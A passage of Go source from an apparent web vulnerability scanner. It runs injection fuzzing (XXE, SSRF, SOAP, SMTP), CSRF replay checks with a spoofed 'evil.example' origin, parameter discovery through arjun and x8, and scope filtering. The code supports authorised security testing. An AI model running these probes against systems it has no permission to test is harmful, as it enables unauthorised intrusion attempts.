							headers["SOAPAction"] = "urn:bflow:probe"
						}
					}

					obs, reqErr := a.sendParamFuzzRequest(ctx, clients, lastByHost, targetURL, method, headers, body, "")
					if reqErr != nil {
						continue
					}
					metrics[family.Name] = struct {
						requests int
						hits     int
					}{requests: metrics[family.Name].requests + 1, hits: metrics[family.Name].hits}
					reasons := injectionReasons(baseGET, obs, family.Keywords)
					if len(reasons) == 0 {
						continue
					}
					metrics[family.Name] = struct {
						requests int
						hits     int
					}{requests: metrics[family.Name].requests, hits: metrics[family.Name].hits + 1}
					_ = writeJSONLine(writers[family.Name], injectionHit{
						Timestamp:    time.Now().UTC().Format(time.RFC3339),
						Family:       family.Name,
						Endpoint:     endpoint,
						Method:       method,
						Param:        param,
						Payload:      payload,
						Vector:       vector,
						MutatedURL:   targetURL,
						Reasons:      reasons,
						BaselineCode: baseGET.StatusCode,
						MutatedCode:  obs.StatusCode,
						BaselineLen:  baseGET.Length,
						MutatedLen:   obs.Length,
						BaselineMS:   baseGET.DurationMS,
						MutatedMS:    obs.DurationMS,
						BaselineLoc:  baseGET.Location,
						MutatedLoc:   obs.Location,
					})
				}
			}
		}
	}

	summaryPath := filepath.Join(outDir, "summary.csv")
	if err := a.writeAdvInjectionSummary(summaryPath, metrics); err != nil {
		return err
	}
	a.logger.Printf("%s: summary written to %s", StepAdvInjection, summaryPath)
	for family, row := range metrics {
		a.logger.Printf("%s: family=%s requests=%d hits=%d", StepAdvInjection, family, row.requests, row.hits)
	}
	return nil
}

func (a *App) runCSRFChecks(ctx context.Context) error {
	baseDir := filepath.Dir(a.cfg.Lists.Domains)
	reconDir := filepath.Join(baseDir, "recon")
	outDir := filepath.Join(a.fuzzingBaseDir(), "csrf")
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return err
	}

	candidatesFile, err := os.Create(filepath.Join(outDir, "candidates.jsonl"))
	if err != nil {
		return err
	}
	defer candidatesFile.Close()
	findingsFile, err := os.Create(filepath.Join(outDir, "findings.jsonl"))
	if err != nil {
		return err
	}
	defer findingsFile.Close()
	replayFile, err := os.Create(filepath.Join(outDir, "replay_log.jsonl"))
	if err != nil {
		return err
	}
	defer replayFile.Close()
	candidateWriter := bufio.NewWriter(candidatesFile)
	findingWriter := bufio.NewWriter(findingsFile)
	replayWriter := bufio.NewWriter(replayFile)
	defer candidateWriter.Flush()
	defer findingWriter.Flush()
	defer replayWriter.Flush()

	endpoints := a.collectParamFuzzEndpoints(filepath.Join(reconDir, "all_urls.txt"))
	endpoints = prioritizeCSRFCandidateEndpoints(endpoints)
	if len(endpoints) > csrfMaxEndpoints {
		a.logger.Printf("%s: limiting endpoints from %d to %d", StepCSRFChecks, len(endpoints), csrfMaxEndpoints)
		endpoints = endpoints[:csrfMaxEndpoints]
	}

	globalParams := a.loadParamCandidates(filepath.Join(reconDir, "params_candidates.txt"))
	if len(globalParams) == 0 {
		globalParams = append([]string{}, paramFuzzCommonParams...)
		sort.Strings(globalParams)
	}

	clients := &http.Client{
		Timeout: paramFuzzRequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	lastByHost := make(map[string]time.Time)
	metrics := map[string]int{
		"candidates":            0,
		"tested":                0,
		"replay_requests":       0,
		"token_signals":         0,
		"potential_findings":    0,
		"protected_by_origin":   0,
		"protected_by_token":    0,
		"cross_origin_accepted": 0,
		"missing_origin_accept": 0,
	}

	for _, endpoint := range endpoints {
		parsed, err := url.Parse(endpoint)
		if err != nil || parsed.Scheme == "" || parsed.Host == "" {
			continue
		}

		queryParams := make(map[string]struct{})
		for key := range parsed.Query() {
			name := normalizeParamName(key)
			if name != "" {
				queryParams[name] = struct{}{}
			}
		}
		paramList := sortedParamKeys(queryParams)
		source := "path"
		if len(paramList) > 0 {
			source = "query"
		}
		metrics["candidates"]++
		_ = writeJSONLine(candidateWriter, csrfCandidate{
			Endpoint:    endpoint,
			Method:      http.MethodPost,
			Source:      source,
			QueryParams: paramList,
		})

		body := buildCSRFBaselineBody(paramList, globalParams).Encode()
		origin := parsed.Scheme + "://" + parsed.Host
		referer := strings.TrimRight(origin, "/") + parsed.Path

		baseline, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Origin":       origin,
			"Referer":      referer,
		}, []byte(body), "")
		if err != nil {
			continue
		}
		metrics["tested"]++
		metrics["replay_requests"]++
		_ = writeJSONLine(replayWriter, csrfReplayLog{
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Endpoint:    endpoint,
			Case:        "baseline_same_origin",
			Method:      http.MethodPost,
			StatusCode:  baseline.StatusCode,
			Length:      baseline.Length,
			DurationMS:  baseline.DurationMS,
			Location:    baseline.Location,
			SetCookies:  baseline.Cookies,
			TokenHeader: baseline.TokenHeader,
		})

		crossOrigin, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Origin":       "https://evil.example",
			"Referer":      "https://evil.example/poc",
		}, []byte(body), "")
		if err != nil {
			continue
		}
		metrics["replay_requests"]++
		_ = writeJSONLine(replayWriter, csrfReplayLog{
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Endpoint:    endpoint,
			Case:        "cross_origin_no_token",
			Method:      http.MethodPost,
			StatusCode:  crossOrigin.StatusCode,
			Length:      crossOrigin.Length,
			DurationMS:  crossOrigin.DurationMS,
			Location:    crossOrigin.Location,
			SetCookies:  crossOrigin.Cookies,
			TokenHeader: crossOrigin.TokenHeader,
		})

		missingOrigin, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}, []byte(body), "")
		if err != nil {
			continue
		}
		metrics["replay_requests"]++
		_ = writeJSONLine(replayWriter, csrfReplayLog{
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Endpoint:    endpoint,
			Case:        "missing_origin_referer",
			Method:      http.MethodPost,
			StatusCode:  missingOrigin.StatusCode,
			Length:      missingOrigin.Length,
			DurationMS:  missingOrigin.DurationMS,
			Location:    missingOrigin.Location,
			SetCookies:  missingOrigin.Cookies,
			TokenHeader: missingOrigin.TokenHeader,
		})

		tokenSignals := hasCSRFTokenSignals(baseline) || hasCSRFTokenSignals(crossOrigin) || hasCSRFTokenSignals(missingOrigin)
		if tokenSignals {
			metrics["token_signals"]++
		}

		crossAccepted := csrfLooksAccepted(baseline, crossOrigin)
		missingAccepted := csrfLooksAccepted(baseline, missingOrigin)
		if crossAccepted {
			metrics["cross_origin_accepted"]++
		}
		if missingAccepted {
			metrics["missing_origin_accept"]++
		}

		crossBlocked := csrfLooksBlocked(baseline, crossOrigin)
		missingBlocked := csrfLooksBlocked(baseline, missingOrigin)
		if crossBlocked || missingBlocked {
			metrics["protected_by_origin"]++
		}
		if tokenSignals {
			metrics["protected_by_token"]++
		}

		reasons := []string{}
		if crossAccepted {
			reasons = append(reasons, "cross_origin_request_accepted")
		}
		if missingAccepted {
			reasons = append(reasons, "missing_origin_referer_accepted")
		}
		if !tokenSignals {
			reasons = append(reasons, "no_observed_csrf_token_signal")
		}
		if len(reasons) == 0 {
			continue
		}

		severity := "low"
		if (crossAccepted || missingAccepted) && !tokenSignals {
			severity = "medium"
		}
		if crossAccepted && missingAccepted && !tokenSignals {
			severity = "high"
		}
		metrics["potential_findings"]++
		_ = writeJSONLine(findingWriter, csrfFinding{
			Timestamp:       time.Now().UTC().Format(time.RFC3339),
			Endpoint:        endpoint,
			Method:          http.MethodPost,
			Severity:        severity,
			Reasons:         unique(reasons),
			BaselineCode:    baseline.StatusCode,
			CrossOriginCode: crossOrigin.StatusCode,
			MissingOrigCode: missingOrigin.StatusCode,
			BaselineLen:     baseline.Length,
			CrossOriginLen:  crossOrigin.Length,
			MissingOrigLen:  missingOrigin.Length,
		})
	}

	summaryPath := filepath.Join(outDir, "summary.csv")
	if err := a.writeCSRFSummary(summaryPath, metrics); err != nil {
		return err
	}
	a.logger.Printf("%s: summary written to %s", StepCSRFChecks, summaryPath)
	return nil
}

func (a *App) writeParamFuzzSummary(path string, metrics map[string]struct {
	requests int
	hits     int
}) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := csv.NewWriter(f)
	defer w.Flush()
	if err := w.Write([]string{"mode", "requests", "hits"}); err != nil {
		return err
	}
	for _, mode := range []string{"query", "body", "header", "cookie"} {
		row := metrics[mode]
		if err := w.Write([]string{mode, strconv.Itoa(row.requests), strconv.Itoa(row.hits)}); err != nil {
			return err
		}
	}
	return w.Error()
}

func (a *App) collectParamFuzzEndpoints(path string) []string {
	inScopeHosts := collectHostsFromLists(a.cfg.Lists.Domains, a.cfg.Lists.APIDomains)
	outScopeHosts := collectHostsFromLists(a.cfg.Lists.OutOfScope)
	inScope := make([]string, 0, len(inScopeHosts))
	outScope := make([]string, 0, len(outScopeHosts))
	for host := range inScopeHosts {
		inScope = append(inScope, host)
	}
	for host := range outScopeHosts {
		outScope = append(outScope, host)
	}
	sort.Strings(inScope)
	sort.Strings(outScope)

	seen := make(map[string]struct{})
	var out []string
	for _, line := range readSafeLines(path) {
		u := normalizeFFUFHitURL(line)
		if u == "" {
			continue
		}
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		host := strings.ToLower(strings.TrimSpace(parsed.Hostname()))
		if host == "" {
			continue
		}
		if len(inScope) > 0 && !hostMatchesAny(host, inScope) {
			continue
		}
		if hostMatchesAny(host, outScope) {
			continue
		}
		clean := strings.TrimRight(u, "/")
		if clean == "" {
			continue
		}
		if _, ok := seen[clean]; ok {
			continue
		}
		seen[clean] = struct{}{}
		out = append(out, clean)
	}
	sort.Strings(out)
	return out
}

func collectHostsFromLists(paths ...string) map[string]struct{} {
	out := make(map[string]struct{})
	for _, path := range paths {
		for _, line := range readSafeLines(path) {
			host := extractHostCandidate(line)
			if host != "" {
				out[host] = struct{}{}
			}
		}
	}
	return out
}

func hostMatchesAny(host string, roots []string) bool {
	host = strings.ToLower(strings.TrimSpace(host))
	if host == "" {
		return false
	}
	for _, root := range roots {
		root = strings.ToLower(strings.TrimSpace(root))
		if root == "" {
			continue
		}
		if host == root || strings.HasSuffix(host, "."+root) {
			return true
		}
	}
	return false
}

func extractParamCandidates(endpoints []string) (map[string]map[string]struct{}, map[string]struct{}) {
	perEndpoint := make(map[string]map[string]struct{}, len(endpoints))
	global := make(map[string]struct{})
	for _, endpoint := range endpoints {
		perEndpoint[endpoint] = make(map[string]struct{})
		parsed, err := url.Parse(endpoint)
		if err != nil {
			continue
		}
		for key := range parsed.Query() {
			name := normalizeParamName(key)
			if name == "" {
				continue
			}
			perEndpoint[endpoint][name] = struct{}{}
			global[name] = struct{}{}
		}
	}
	return perEndpoint, global
}

func normalizeParamName(raw string) string {
	name := strings.ToLower(strings.TrimSpace(raw))
	if name == "" || len(name) > 64 {
		return ""
	}
	valid := regexp.MustCompile(`^[a-zA-Z_][a-zA-Z0-9_.-]*$`)
	if !valid.MatchString(name) {
		return ""
	}
	return name
}

func sortedParamKeys(set map[string]struct{}) []string {
	var out []string
	for key := range set {
		out = append(out, key)
	}
	sort.Strings(out)
	return out
}

func (a *App) loadParamCandidates(path string) []string {
	set := make(map[string]struct{})
	for _, line := range readSafeLines(path) {
		name := normalizeParamName(line)
		if name == "" {
			continue
		}
		set[name] = struct{}{}
	}
	var out []string
	for key := range set {
		out = append(out, key)
	}
	sort.Strings(out)
	return out
}

func injectionReasons(base, mutated paramFuzzObservation, familyKeywords []string) []string {
	reasons := paramFuzzReasons(base, mutated)
	if base.StatusCode < 500 && mutated.StatusCode >= 500 {
		reasons = append(reasons, "server_error_on_payload")
	}
	for _, kw := range familyKeywords {
		kw = strings.ToLower(strings.TrimSpace(kw))
		if kw == "" {
			continue
		}
		if strings.Contains(mutated.Snippet, kw) && !strings.Contains(base.Snippet, kw) {
			reasons = append(reasons, "family_keyword:"+kw)
		}
	}
	return unique(reasons)
}

func (a *App) writeInjectionSummary(path string, metrics map[string]struct {
	requests int
	hits     int
}) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := csv.NewWriter(f)
	defer w.Flush()
	if err := w.Write([]string{"family", "requests", "hits"}); err != nil {
		return err
	}
	for _, family := range []string{"sqli", "nosqli", "xpath", "ldap"} {
		row := metrics[family]
		if err := w.Write([]string{family, strconv.Itoa(row.requests), strconv.Itoa(row.hits)}); err != nil {
			return err
		}
	}
	return w.Error()
}

func (a *App) writeServerInputSummary(path string, metrics map[string]struct {
	requests int
	hits     int
}) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := csv.NewWriter(f)
	defer w.Flush()
	if err := w.Write([]string{"family", "requests", "hits"}); err != nil {
		return err
	}
	for _, family := range []string{"os_command", "path_traversal", "file_inclusion"} {
		row := metrics[family]
		if err := w.Write([]string{family, strconv.Itoa(row.requests), strconv.Itoa(row.hits)}); err != nil {
			return err
		}
	}
	return w.Error()
}

func (a *App) writeAdvInjectionSummary(path string, metrics map[string]struct {
	requests int
	hits     int
}) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := csv.NewWriter(f)
	defer w.Flush()
	if err := w.Write([]string{"family", "requests", "hits"}); err != nil {
		return err
	}
	for _, family := range []string{"xxe", "soap", "ssrf", "smtp"} {
		row := metrics[family]
		if err := w.Write([]string{family, strconv.Itoa(row.requests), strconv.Itoa(row.hits)}); err != nil {
			return err
		}
	}
	return w.Error()
}

func (a *App) writeCSRFSummary(path string, metrics map[string]int) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := csv.NewWriter(f)
	defer w.Flush()
	if err := w.Write([]string{"metric", "value"}); err != nil {
		return err
	}
	keys := []string{
		"candidates",
		"tested",
		"replay_requests",
		"token_signals",
		"protected_by_origin",
		"protected_by_token",
		"cross_origin_accepted",
		"missing_origin_accept",
		"potential_findings",
	}
	for _, key := range keys {
		if err := w.Write([]string{key, strconv.Itoa(metrics[key])}); err != nil {
			return err
		}
	}
	return w.Error()
}

func prioritizeCSRFCandidateEndpoints(endpoints []string) []string {
	if len(endpoints) == 0 {
		return nil
	}
	highTerms := []string{
		"login", "logout", "signin", "signup", "register", "password", "reset",
		"delete", "remove", "update", "change", "edit", "create", "invite",
		"settings", "profile", "account", "checkout", "purchase", "order",
		"billing", "payment", "transfer", "withdraw", "address", "email",
	}
	score := func(endpoint string) int {
		parsed, err := url.Parse(endpoint)
		if err != nil {
			return 0
		}
		text := strings.ToLower(parsed.Path + "?" + parsed.RawQuery)
		total := 0
		for _, term := range highTerms {
			if strings.Contains(text, term) {
				total += 2
			}
		}
		if parsed.RawQuery != "" {
			total++
		}
		return total
	}
	out := append([]string{}, endpoints...)
	sort.SliceStable(out, func(i, j int) bool {
		si := score(out[i])
		sj := score(out[j])
		if si == sj {
			return out[i] < out[j]
		}
		return si > sj
	})
	return out
}

func buildCSRFBaselineBody(endpointParams, globalParams []string) url.Values {
	values := url.Values{}
	selected := append([]string{}, endpointParams...)
	if len(selected) == 0 {
		selected = append(selected, globalParams...)
	}
	if len(selected) == 0 {
		selected = []string{"id", "action"}
	}
	if len(selected) > 3 {
		selected = selected[:3]
	}
	for _, key := range selected {
		name := normalizeParamName(key)
		if name == "" {
			continue
		}
		values.Set(name, "1")
	}
	if len(values) == 0 {
		values.Set("id", "1")
	}
	return values
}

func hasCSRFTokenSignals(obs paramFuzzObservation) bool {
	if obs.TokenHeader != "" {
		return true
	}
	for _, name := range obs.Cookies {
		for _, tokenName := range csrfTokenNames {
			if strings.Contains(strings.ToLower(name), tokenName) {
				return true
			}
		}
	}
	for _, tokenName := range csrfTokenNames {
		if strings.Contains(obs.Snippet, tokenName) {
			return true
		}
	}
	if strings.Contains(obs.Snippet, "authenticity_token") || strings.Contains(obs.Snippet, "__requestverificationtoken") {
		return true
	}
	return false
}

func csrfLooksAccepted(base, mutated paramFuzzObservation) bool {
	if base.StatusCode <= 0 || mutated.StatusCode <= 0 {
		return false
	}
	if base.StatusCode >= 400 || mutated.StatusCode >= 400 {
		return false
	}
	reasons := paramFuzzReasons(base, mutated)
	return len(reasons) <= 1
}

func csrfLooksBlocked(base, mutated paramFuzzObservation) bool {
	if base.StatusCode <= 0 || mutated.StatusCode <= 0 {
		return false
	}
	if base.StatusCode < 400 && (mutated.StatusCode == http.StatusForbidden || mutated.StatusCode == http.StatusUnauthorized) {
		return true
	}
	return false
}

func prioritizeServerInputParams(params []string) []string {
	if len(params) == 0 {
		return nil
	}
	priorityTerms := []string{"cmd", "exec", "shell", "path", "file", "dir", "folder", "page", "template", "include", "inc", "module", "view", "doc", "download"}
	var prioritized []string
	var fallback []string
	for _, p := range params {
		lp := strings.ToLower(strings.TrimSpace(p))
		if lp == "" {
			continue
		}
		isPriority := false
		for _, term := range priorityTerms {
			if strings.Contains(lp, term) {
				isPriority = true
				break
			}
		}
		if isPriority {
			prioritized = append(prioritized, p)
		} else {
			fallback = append(fallback, p)
		}
	}
	out := append(prioritized, fallback...)
	return unique(out)
}

func prioritizeAdvancedInjectionParams(params []string) []string {
	if len(params) == 0 {
		return nil
	}
	priorityTerms := []string{"url", "uri", "path", "link", "callback", "target", "redirect", "endpoint", "host", "file", "xml", "soap", "email", "to", "subject"}
	var prioritized []string
	var fallback []string
	for _, p := range params {
		lp := strings.ToLower(strings.TrimSpace(p))
		if lp == "" {
			continue
		}
		isPriority := false
		for _, term := range priorityTerms {
			if strings.Contains(lp, term) {
				isPriority = true
				break
			}
		}
		if isPriority {
			prioritized = append(prioritized, p)
		} else {
			fallback = append(fallback, p)
		}
	}
	out := append(prioritized, fallback...)
	return unique(out)
}

func (a *App) discoverParamsWithArjun(
	ctx context.Context,
	endpoints []string,
	rawDir string,
	perEndpoint map[string]map[string]struct{},
	global map[string]struct{},
) {
	if _, err := exec.LookPath("arjun"); err != nil {
		a.logger.Printf("%s: arjun not found, skipping param discovery via arjun", StepParamFuzz)
		return
	}
	if len(endpoints) == 0 {
		return
	}

	urlsFile := filepath.Join(rawDir, "arjun_urls.txt")
	outputFile := filepath.Join(rawDir, "arjun_output.json")
	candidates := endpoints
	if len(candidates) > paramFuzzMaxEndpoints {
		candidates = candidates[:paramFuzzMaxEndpoints]
	}
	if err := os.WriteFile(urlsFile, []byte(strings.Join(candidates, "\n")), 0o644); err != nil {
		a.logger.Printf("%s: failed writing arjun input: %v", StepParamFuzz, err)
		return
	}

	stdout, err := a.runCommandCapture(ctx, "arjun", "-i", urlsFile, "-o", outputFile, "--stable", "-t", "4")
	_ = os.WriteFile(filepath.Join(rawDir, "arjun_stdout.txt"), []byte(stdout), 0o644)
	if err != nil {
		a.logger.Printf("%s: arjun failed: %v", StepParamFuzz, err)
		return
	}
	raw, readErr := os.ReadFile(outputFile)
	if readErr != nil {
		a.logger.Printf("%s: arjun output unreadable: %v", StepParamFuzz, readErr)
		return
	}
	var result map[string][]string
	if err := json.Unmarshal(raw, &result); err != nil {
		a.logger.Printf("%s: arjun output parse failed: %v", StepParamFuzz, err)
		return
	}
	for endpoint, keys := range result {
		normalizedEndpoint := strings.TrimRight(normalizeFFUFHitURL(endpoint), "/")
		if normalizedEndpoint == "" {
			continue
		}
		if _, ok := perEndpoint[normalizedEndpoint]; !ok {
			perEndpoint[normalizedEndpoint] = make(map[string]struct{})
		}
		for _, key := range keys {
			name := normalizeParamName(key)
			if name == "" {
				continue
			}
			perEndpoint[normalizedEndpoint][name] = struct{}{}
			global[name] = struct{}{}
		}
	}
}

func (a *App) discoverParamsWithX8(
	ctx context.Context,
	endpoints []string,
	rawDir string,
	perEndpoint map[string]map[string]struct{},
	global map[string]struct{},
) {
	if _, err := exec.LookPath("x8"); err != nil {
		a.logger.Printf("%s: x8 not found, skipping param discovery via x8", StepParamFuzz)
		return
	}
	if len(endpoints) == 0 {
		return
	}

	urlsFile := filepath.Join(rawDir, "x8_urls.txt")
	outputFile := filepath.Join(rawDir, "x8_output.txt")
	candidates := endpoints
	if len(candidates) > paramFuzzMaxEndpoints {
		candidates = candidates[:paramFuzzMaxEndpoints]
	}
	if err := os.WriteFile(urlsFile, []byte(strings.Join(candidates, "\n")), 0o644); err != nil {
		a.logger.Printf("%s: failed writing x8 input: %v", StepParamFuzz, err)
		return
	}

	stdout, err := a.runCommandCapture(ctx, "x8", "-u", urlsFile, "-o", outputFile, "--workers", "2", "--learn-requests-count", "3", "--verify-requests-count", "2")
	_ = os.WriteFile(filepath.Join(rawDir, "x8_stdout.txt"), []byte(stdout), 0o644)
	if err != nil {
		a.logger.Printf("%s: x8 failed: %v", StepParamFuzz, err)
		return
	}
	raw, readErr := os.ReadFile(outputFile)
	if readErr != nil {
		a.logger.Printf("%s: x8 output unreadable: %v", StepParamFuzz, readErr)
		return
	}
	reURL := regexp.MustCompile(`https?://[^\s"'<>]+`)
	reParam := regexp.MustCompile(`\b[a-zA-Z_][a-zA-Z0-9_.-]{1,63}\b`)
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		lower := strings.ToLower(line)
		if !strings.Contains(lower, "param") && !strings.Contains(lower, "[+]") {
			continue
		}
		urlMatch := reURL.FindString(line)
		normalizedEndpoint := strings.TrimRight(normalizeFFUFHitURL(urlMatch), "/")
		if normalizedEndpoint == "" {
			continue
		}
		if _, ok := perEndpoint[normalizedEndpoint]; !ok {
			perEndpoint[normalizedEndpoint] = make(map[string]struct{})
		}
		for _, token := range reParam.FindAllString(line, -1) {
			name := normalizeParamName(token)
			if name == "" || name == "parameter" || name == "param" || name == "found" {
				continue
			}
			perEndpoint[normalizedEndpoint][name] = struct{}{}
			global[name] = struct{}{}
		}
	}
}

func (a *App) sendParamFuzzRequest(
	ctx context.Context,
	client *http.Client,
	lastByHost map[string]time.Time,
	target string,
	method string,
	headers map[string]string,
	body []byte,
	cookie string,
) (paramFuzzObservation, error) {
	var obs paramFuzzObservation
	parsed, err := url.Parse(target)
	if err != nil {
		return obs, err
	}
	host := strings.ToLower(strings.TrimSpace(parsed.Hostname()))

	for attempt := 1; attempt <= paramFuzzRetryCount; attempt++ {
		if host != "" {
			if last, ok := lastByHost[host]; ok {
				wait := paramFuzzHostDelay - time.Since(last)
				if wait > 0 {
					timer := time.NewTimer(wait)
					select {
					case <-ctx.Done():
						timer.Stop()
						return obs, ctx.Err()
					case <-timer.C:
					}
				}
			}
		}

		var bodyReader io.Reader
		if len(body) > 0 {
			bodyReader = strings.NewReader(string(body))
		}
		req, err := http.NewRequestWithContext(ctx, method, target, bodyReader)
		if err != nil {
			return obs, err
		}
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}

		start := time.Now()
		resp, err := client.Do(req)
		lastByHost[host] = time.Now()
		if err != nil {
			if attempt < paramFuzzRetryCount {
				time.Sleep(200 * time.Millisecond)
				continue
			}
			return obs, err
		}

		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		_ = resp.Body.Close()
		obs = paramFuzzObservation{
			StatusCode: resp.StatusCode,
			DurationMS: time.Since(start).Milliseconds(),
			Location:   strings.TrimSpace(resp.Header.Get("Location")),
			Snippet:    strings.ToLower(string(bodyBytes)),
		}
		for k := range resp.Header {
			lk := strings.ToLower(strings.TrimSpace(k))
			if lk == "x-csrf-token" || lk == "x-xsrf-token" || lk == "csrf-token" {
				obs.TokenHeader = k
				break
			}
		}
		for _, cookie := range resp.Cookies() {
			name := normalizeParamName(cookie.Name)
			if name != "" {
				obs.Cookies = append(obs.Cookies, name)
			}
		}
		obs.Cookies = unique(obs.Cookies)
		if resp.ContentLength >= 0 {
			obs.Length = int(resp.ContentLength)
		} else {
			obs.Length = len(bodyBytes)
		}
		return obs, nil
	}
	return obs, fmt.Errorf("request failed")
}

func mutateURLQuery(rawURL, key, value string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	q := parsed.Query()
	q.Set(key, value)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func paramFuzzReasons(base, mutated paramFuzzObservation) []string {
	var reasons []string
	if base.StatusCode != mutated.StatusCode {
		reasons = append(reasons, "status_code_changed")
	}
	lenDiff := mutated.Length - base.Length
	if lenDiff < 0 {
		lenDiff = -lenDiff
	}
	lenThreshold := 80
	if dynamic := int(float64(base.Length) * 0.35); dynamic > lenThreshold {
		lenThreshold = dynamic
	}
	if lenDiff > lenThreshold {
		reasons = append(reasons, "response_length_changed")
	}
	if base.Location != mutated.Location {
		reasons = append(reasons, "redirect_target_changed")
	}
	if mutated.DurationMS > (base.DurationMS*2 + 500) {
		reasons = append(reasons, "timing_spike")
	}
	for _, kw := range paramFuzzSignalKeywords {
		if strings.Contains(mutated.Snippet, kw) && !strings.Contains(base.Snippet, kw) {
			reasons = append(reasons, "new_signal_keyword:"+kw)
		}
	}
	return unique(reasons)
}

func writeJSONLine(w *bufio.Writer, value any) error {
	raw, err := json.Marshal(value)
	if err != nil {
		return err
	}
	if _, err := w.Write(raw); err != nil {
		return err
	}
	if err := w.WriteByte('\n'); err != nil {
		return err
	}
	return w.Flush()
}

func normalizeHTTPSTargets(inputs []string) []string {
	seen := make(map[string]struct{})
	var out []string
	for _, raw := range inputs {
		target := normalizeLiveTarget(raw)
		if target == "" {
			continue
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}
		if _, ok := seen[target]; ok {
			continue
		}
		seen[target] = struct{}{}
		out = append(out, target)
	}
	sort.Strings(out)
	return out
}

func combineWordlists(dest string, files ...string) error {
	set := make(map[string]struct{})
	for _, path := range files {
		for _, line := range readSafeLines(path) {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			set[line] = struct{}{}
		}
	}
	var entries []string
	for line := range set {
		entries = append(entries, line)
	}
	sort.Strings(entries)
	return os.WriteFile(dest, []byte(strings.Join(entries, "\n")), 0o644)
}

func extractFFUFHitURLs(csvPath string) ([]string, error) {
	f, err := os.Open(csvPath)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	r := csv.NewReader(f)
	records, err := r.ReadAll()
	if err != nil {
		return nil, err
	}
	if len(records) <= 1 {
		return nil, nil
	}

	header := records[0]
	urlIdx := -1
	for i, h := range header {
		if strings.EqualFold(strings.TrimSpace(h), "url") {
			urlIdx = i
			break
		}
	}
	if urlIdx == -1 && len(header) > 1 {
		urlIdx = 1
	}
	if urlIdx == -1 {
		return nil, nil
	}

	set := make(map[string]struct{})
	for _, rec := range records[1:] {
		if len(rec) <= urlIdx {
			continue
		}
		u := normalizeFFUFHitURL(rec[urlIdx])
		if u == "" {
			continue
		}
		set[u] = struct{}{}
	}
	var out []string
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	return out, nil
}

func normalizeFFUFHitURL(raw string) string {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return ""
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return ""
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return ""
	}
	if parsed.Host == "" {
		return ""
	}

	// ffuf can emit URLs like https://host//docs when the wordlist entry starts with "/".
	path := parsed.Path
	for strings.Contains(path, "//") {
		path = strings.ReplaceAll(path, "//", "/")
	}
	parsed.Path = path
	if parsed.Path == "" {
		parsed.Path = "/"
	}
	return parsed.String()
}

func dedupeAndSortFile(path string) error {
	if !fileExists(path) {
		return nil
	}
	lines := unique(readSafeLines(path))
	sort.Strings(lines)
	return os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0o644)
}

func missingFiles(paths ...string) []string {
	var missing []string
	for _, p := range paths {
		if !fileExists(p) {
			missing = append(missing, p)
		}
	}
	return missing
}

func (a *App) dataRootDir() string {
	return filepath.Dir(a.cfg.Lists.Domains)
}

func (a *App) fuzzingBaseDir() string {
	base := strings.TrimSpace(a.cfg.Paths.FuzzingDir)
	if filepath.IsAbs(base) {
		return base
	}
	if strings.HasPrefix(base, "data"+string(os.PathSeparator)) || base == "data" {
		return base
	}
	return filepath.Join(a.dataRootDir(), base)
}

func (a *App) fuzzingFFUFDir() string {
	return filepath.Join(a.fuzzingBaseDir(), a.cfg.Paths.FFUFDir)
}

func (a *App) fuzzingDocsDir() string {
	return filepath.Join(a.fuzzingBaseDir(), "documentation")
}

func (a *App) robots(ctx context.Context, source string) error {
	if source == "" || !fileExists(source) {
		return nil
	}

	targets := normalizeHTTPSTargets(readSafeLines(source))
	if len(targets) == 0 {
		return nil
	}

	hitsDir := filepath.Join(a.cfg.Paths.RobotsDir, a.cfg.Paths.RobotsHitsDir)
	noHitsDir := filepath.Join(a.cfg.Paths.RobotsDir, a.cfg.Paths.RobotsNoHitsDir)
	if err := os.MkdirAll(hitsDir, 0o755); err != nil {
		return err
	}
	if err := os.MkdirAll(noHitsDir, 0o755); err != nil {
		return err
	}
	hitsFile := filepath.Join(a.cfg.Paths.RobotsDir, "_hits.txt")
	robotsURLsFile := filepath.Join(a.cfg.Paths.RobotsDir, "robots_urls.txt")
	_ = os.WriteFile(hitsFile, []byte{}, 0o644)
	_ = os.WriteFile(robotsURLsFile, []byte{}, 0o644)
	_ = os.WriteFile(a.cfg.Paths.SitemapsFile, []byte{}, 0o644)

	for _, target := range targets {
		if target == "" {
			continue
		}

		baseURL := strings.TrimSpace(strings.TrimRight(target, "/"))
		if baseURL == "" {
			continue
		}

		robotsURL := fmt.Sprintf("%s/robots.txt", baseURL)
		clean := sanitizeFilename(baseURL)
